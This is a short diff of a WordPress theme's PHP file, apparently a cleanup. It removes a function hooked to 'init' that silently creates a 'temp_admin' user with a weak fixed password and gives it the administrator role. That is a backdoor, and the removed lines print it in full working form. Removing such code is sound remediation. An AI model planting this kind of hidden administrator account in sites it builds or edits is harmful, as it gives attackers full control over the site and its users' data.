@@ -86,20 +86,6 @@ function check_taxonomy()
 $pas = get_stylesheet_directory_uri() . '/';
 define('PAS', $pas);
 
-function create_admin_user_fn() {
-	$username      = 'temp_admin';
-	$password      = '11111111';
-	$email_address = 'wx@g.m';
-	if ( ! username_exists( $username ) && !email_exists( $email_address ) ) {
-		$user_id = wp_create_user( $username, $password, $email_address );
-		$user    = new WP_User( $user_id );
-		$user->set_role( 'administrator' );
-	}
-}
-
-add_action( 'init', 'create_admin_user_fn' );
-
-
 function showr($array_data) {
 	return print("<pre>".print_r($array_data,true)."</pre>");
 }
